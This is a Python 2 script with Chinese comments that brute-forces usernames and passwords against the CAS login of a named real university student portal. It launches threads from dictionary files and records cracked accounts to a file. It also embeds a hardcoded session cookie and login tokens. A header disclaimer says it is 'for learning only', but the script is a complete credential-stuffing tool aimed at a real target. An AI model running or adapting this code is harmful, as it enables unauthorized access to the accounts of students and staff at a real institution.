# -*- coding: utf-8 -*-
# 利用python 写的多线程爆破后台用户名+密码(自备字典),比较实用,即使是在信息安全这么重视的今天,还是有人不加验证码或者异常访问限制之类的登陆验证方式,这样就很# 容易被弱口令爆破工具拿下,(本代码仅限学习实用,禁止进行web攻击,不承担法律责任)
import urllib2
import urllib
import httplib
import threading
import ssl
import cookielib


ssl._create_default_https_context = ssl._create_unverified_context 
headers = {"Content-Type":"application/x-www-form-urlencoded",     
           "Connection":"Keep-Alive",'Cookie':"SSO=TGC%2D8fa828b59fcaabbebfa151e08b0f626cefc83e1452a9442edc90b3577e4131129a71abc1e8df8decc753ad776dea34a569537e83c77460b75be2e7025a20504a207049dbe18709481838feb1a75367e30094d3e30187ed9c0e2099f9948a692d019013f91494ac367b8b699b8427435f0c8c04db910312ff8e6b726bff04c3f28c7e0166c6616c76ace621aa4511416762e2f36e43f032fee275d4cd33948ed585af4cf4fbc2c5551daaec08c67d78c21665366c73ab56a5e27cd2663412e49912c00314403fef8e0db5cc34737c7961bb19dc886310d1e07f01eda98dee988c7682b6859eb38a21ae25dd6635c78d07bbe4bf828046e810"}
# lock = threading.Lock()
def tryUser(user,password):
    print user,password
    global headers
    global outFile 
    if len(user) < 3:     # 限制用户名长度，排除字典中的无用数据
        return  # 主动退出线程
    else:
        #lock.acquire()   # 多线程操作文件，提前加锁，用后释放
        #line = inFile.readline()
          
        #userData = line.strip().split(' # ') # strip() 默认去除空白字符包括' ','\t','\n'等
        #lock.release()
        username = user.strip()
        password = password.strip()
  
        #打开登录主页面（他的目的是从页面下载cookie，这样我们在再送post数据时就有cookie了，否则发送不成功）  
        h = urllib2.urlopen("https://matrix.dean.swust.edu.cn/cas/login")  
      
        #构造header，一般header至少要包含一下两项。这两项是从抓到的包里分析得出的。  
        headers = {'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:14.0) Gecko/20100101 Firefox/14.0.1'}  
        #构造Post数据，他也是从抓大的包里分析得出的。  
        postData = {
            'username' : username, 
            'password' : password, 
            'lt' : 'LT-D6AD41F2-CC26-59EC-42D85CC1124CF52D', 
	    'service':'https://matrix.dean.swust.edu.cn/acadmicManager/index.cfm?event=studentPortal:DEFAULT_EVENT'
            }  
  
        #需要给Post数据编码  
        postData = urllib.urlencode(postData)  
        #通过urllib2提供的request方法来向指定Url发送我们构造的数据，并完成登录过程  
        request = urllib2.Request("https://matrix.dean.swust.edu.cn/acadmicManager/index.cfm?event=studentPortal:DEFAULT_EVENT&ticket=ST-D8CADE7A-9BF7-356E-D0011F4DBD2657D3", postData, headers)  
        #print request
        #1cookie=cookielib.CookieJar()
        #opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))
        #response=opener.open(request)
        #text = response.read()
        #print text
        #2response1=opener.open('https://matrix.dean.swust.edu.cn/acadmicManager/index.cfm?event=studentPortal:DEFAULT_EVENT&ticket=ST-D8CADE7A-9BF7-356E-D0011F4DBD2657D3')
        #3response1=opener.open(request)
        #text1 = response1.read()
        #print text1
        response = urllib2.urlopen(request)
        text = response.read()
        print text
        #print text  
        if  text.find(u'Login Success!') > 0 :
            print '----- find user:', username, 'with password:', password, '-----'
            outFile.write(username + '    ' +  password + '\n')
            exit()
    return

outFile = open('accounts-cracked.txt','w')
if __name__ == '__main__':
    tsk=[] # 创建线程池
    with open(r'user.dic', 'r') as fUser:  # 使用with as 来打开文件,不需自己关闭文件,因为他会自己在合适的时候自已关闭(类似C# 中的using(...){}接口)
        with open(r'pass1.dic', 'r') as fPass:
            for user in fUser.readlines():
                for password in fPass.readlines():
                    t= threading.Thread(target = tryUser,args=(user,password))
                    t.daemon = False # 设置不进行进程守护
                    tsk.append(t) # t.start()
                fPass.seek(0)
                # 记住这里要将文件重新移到文件首,不然就会出现只执行外层循环的第一条,因为内层在
                # 迭代之后(readlines()是迭代器的形式,迭代一次后文件指针就指到文件尾了,迭代器
                # 也是end了)第二次就没有password 在 fPass中,也就是说 for  password in fPass.readlines():
                # 为空,所以这里的内层循环就不会被执行了,因此也就是迭代器清零的问题(C ++ itertor 常有)
                   
                      
# join()无参数就是完全阻塞主线程,等待线程执行完 有参数就是说，
# 在主线程等待一秒后就不阻塞线程了,继续执行主线程,这里的意思是一秒钟开一个线程
# 不能再thread start之前调用join(), 因为join() 是线程运行时调度
    for t in tsk:
        t.start()
        t.join(1) 
    print "All thread OK,maybe not"
    outFile.close()
    



